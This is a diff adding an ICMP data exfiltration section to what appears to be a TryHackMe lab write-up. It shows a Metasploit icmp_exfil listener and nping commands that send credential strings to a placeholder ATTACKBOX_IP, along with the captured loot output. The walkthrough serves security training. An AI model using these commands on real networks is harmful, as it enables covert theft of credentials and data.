@@ -87,6 +87,87 @@ thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
 tmp/task6/
 tmp/task6/creds.txt
 ```
+#### ICMP Data Exflitration
+![icmp1](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/c6648109-b53a-4d1d-a030-758c8d2e3f32)  
+
+- Set the BPF_FILTER in MSF  
+```
+msf5 > use auxiliary/server/icmp_exfil
+msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
+BPF_FILTER => icmp and not src ATTACKBOX_IP
+```  
+- Set the interface in MSF  
+```
+msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
+INTERFACE => eth0
+msf5 auxiliary(server/icmp_exfil) > run
+    
+[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
+[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
+```  
+The [nping](https://nmap.org/nping/) tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the NMAP suite tools.  
+- Sending the Trigger Value from the Victim  
+```
+thm@jump-box$ ssh thm@icmp.thm.com
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
+SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
+RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
+RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]
+    
+Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
+Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.06 seconds
+```  
+- Sending the Data and the End of the File Trigger Value  
+```
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
+SENT (0.0312s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
+RCVD (0.0328s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
+RCVD (0.0703s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]
+    
+Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
+Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.06 seconds 
+    
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
+SENT (0.0354s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
+RCVD (0.0358s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
+RCVD (0.0748s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]
+    
+Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
+Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.07 seconds 
+    
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
+SENT (0.0364s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
+RCVD (0.0369s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
+RCVD (0.3760s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]
+    
+Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
+Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.07 seconds
+thm@icmp-host:~#
+```  
+- Receiving Data in MSF  
+```
+msf5 auxiliary(server/icmp_exfil) > run
+    
+[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
+[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
+[+] Beginning capture of "file.txt" data
+[*] 30 bytes of data received in total
+[+] End of File received. Saving "file.txt" to loot
+[+] Incoming file "file.txt" saved to loot
+[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
+```
 
 
 ### Tunneling
